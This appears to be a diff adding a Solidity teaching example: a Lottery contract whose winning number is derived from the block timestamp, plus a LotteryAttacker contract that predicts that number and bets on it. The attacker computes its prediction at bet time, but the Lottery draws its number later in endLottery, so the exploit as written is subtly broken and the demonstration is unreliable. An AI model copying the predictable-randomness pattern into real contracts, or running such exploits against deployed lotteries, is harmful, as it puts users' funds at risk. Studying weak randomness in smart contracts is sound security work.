@@ -1,0 +1,79 @@
+// SPDX-License-Identifier: MIT
+pragma solidity 0.8.9;
+
+contract Lottery 
+{
+  address admin;
+  uint8 public winningNumber;
+  mapping(address => uint8) public bets;
+  bool public betsClosed;
+  bool public prizeTaken;
+
+  constructor()
+  {
+    admin = msg.sender;
+  }
+
+  function placeBet(uint8 _number) external payable 
+  {
+    require(bets[msg.sender] == 0, "Only 1 bet per player");
+    require(msg.value == 10 ether, "Bet cost: 10 ether");
+    require(betsClosed == false, "Bets are closed");
+    require(_number > 0 && _number <= 255, "Must be a number from 1 to 255");
+
+    bets[msg.sender] = _number;
+  }
+
+  function endLottery() external  
+  {
+    require(admin == msg.sender, "Not admin.");
+
+    betsClosed = true;
+
+    winningNumber = pseudoRandNumGen();
+  }
+
+  function withdrawPrize() external 
+  {
+    require(betsClosed == true, "Bets are still open");
+    require(prizeTaken == false, "Prize already taken");
+    require(bets[msg.sender] == winningNumber, "You aren't the winner");
+
+    prizeTaken = true;
+
+    (bool sent, bytes memory data) = (msg.sender).call{value: address(this).balance}("");
+    require(sent, "Send oof ether failed.");
+  }
+
+  function pseudoRandNumGen() private view returns (uint8) 
+  {
+    return uint8(uint256(keccak256(abi.encode(block.timestamp))) % 254) + 1;
+  }
+}
+
+
+
+interface ILottery 
+{
+  function placeBet(uint8 _number) external payable;
+}
+
+contract LotteryAttacker
+{
+  ILottery private victim;
+
+  constructor(address _victim) 
+  {
+    victim = ILottery(_victim);
+  }
+
+  function attack() external payable
+  {
+    uint8 winningNumber = getWinningNumber();
+    victim.placeBet{ value: 10 ether }(winningNumber);
+  }
+
+  function getWinningNumber() private view returns (uint8) {
+    return uint8(uint256(keccak256(abi.encodePacked(block.timestamp))) % 254) + 1;
+  }
+}
